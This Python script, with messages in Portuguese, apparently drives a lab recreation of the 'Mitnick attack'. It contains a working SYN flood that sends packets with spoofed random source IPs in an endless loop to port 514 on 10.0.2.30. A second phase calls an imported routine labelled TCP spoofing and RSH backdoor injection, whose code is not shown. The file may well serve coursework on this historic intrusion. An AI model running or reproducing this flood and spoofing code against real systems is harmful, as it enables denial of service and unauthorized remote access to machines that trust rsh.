import argparse
import time
from scapy.all import *
from rsh import spoof_and_inject_rsh


def execute_syn_flood():
    flood_target_addr = "10.0.2.30"
    flood_target_port = 514

    print(f"[>] Disparando SYN flood contra {flood_target_addr}:{flood_target_port}")
    print("[>] Ctrl+C para encerrar.")

    try:
        while True:
            ip_hdr = IP(src=RandIP(), dst=flood_target_addr)
            tcp_hdr = TCP(sport=RandShort(), dport=flood_target_port, flags="S")
            send(ip_hdr / tcp_hdr, verbose=0)
    except KeyboardInterrupt:
        print("\n[+] Flood encerrado.")


if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser(
        description="Script principal do ataque Mitnick"
    )
    arg_parser.add_argument(
        "--phase",
        choices=["dos", "forge_and_inject"],
        required=True,
        help="Fase do ataque a ser executada"
    )
    cli_args = arg_parser.parse_args()

    if cli_args.phase == "dos":
        execute_syn_flood()
    elif cli_args.phase == "forge_and_inject":
        print("[>] Executando spoofing TCP e injecao de backdoor RSH...")
        spoof_and_inject_rsh()
